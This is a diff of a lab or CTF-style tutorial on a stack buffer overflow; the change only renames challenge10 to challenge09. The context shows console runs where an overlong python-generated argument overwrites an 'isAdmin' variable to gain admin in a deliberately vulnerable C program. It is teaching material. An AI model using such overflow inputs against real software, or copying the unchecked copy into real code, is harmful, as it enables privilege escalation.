@@ -17,7 +17,7 @@ will change the function flow, which enables us to gain "admin" privileges.
 
 We have the following program:
 
-challenge10.c:
+challenge09.c:
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -70,7 +70,7 @@ int main(int argc, char **argv) {
 }
 ```
 
-You can compile it by calling `make` in the folder `~/challenges/challenge10`
+You can compile it by calling `make` in the folder `~/challenges/challenge09`
 
 
 ## Vulnerability
@@ -102,7 +102,7 @@ After this buffer `name`, an important variable called `isAdmin` is located.
 Lets execute the program with normal length string, and with a wrong password:
 
 ```
-root@hlUbuntu32aslr:~/challenges/challenge10# ./challenge10 sheldon test
+root@hlUbuntu32aslr:~/challenges/challenge09# ./challenge09 sheldon test
 Hello cmd-sheldon.
 You are not admin.
 isAdmin: 0x0
@@ -113,7 +113,7 @@ The password "test" seems to be not correct, as the program tells us "You are no
 
 Lets execute it with the correct password `ourteacheristehbest`:
 ```
-root@hlUbuntu32aslr:~/challenges/challenge10# ./challenge10 sheldon ourteacheristehbest
+root@hlUbuntu32aslr:~/challenges/challenge09# ./challenge09 sheldon ourteacheristehbest
 Hello cmd-sheldon.
 You are admin!
 isAdmin: 0x1
@@ -128,7 +128,7 @@ What happens when you insert a string which is longer than 64 bytes? Lets try it
 We can use python to print 70 characters:
 
 ```
-root@hlUbuntu32aslr:~/challenges/challenge10# ./challenge10 `python -c 'print "A"*70'` test
+root@hlUbuntu32aslr:~/challenges/challenge09# ./challenge09 `python -c 'print "A"*70'` test
 Hello cmd-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
 You are admin!
 isAdmin: 0x41414141
@@ -139,7 +139,7 @@ isAdmin: 0x41414141
 What if we even add some more characters? Lets say 100.
 
 ```
-root@hlUbuntu32aslr:~/challenges/challenge10# ./challenge10 `python -c 'print "A"*100'` test
+root@hlUbuntu32aslr:~/challenges/challenge09# ./challenge09 `python -c 'print "A"*100'` test
 Hello cmd-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
 You are admin!
 isAdmin: 0x41414141
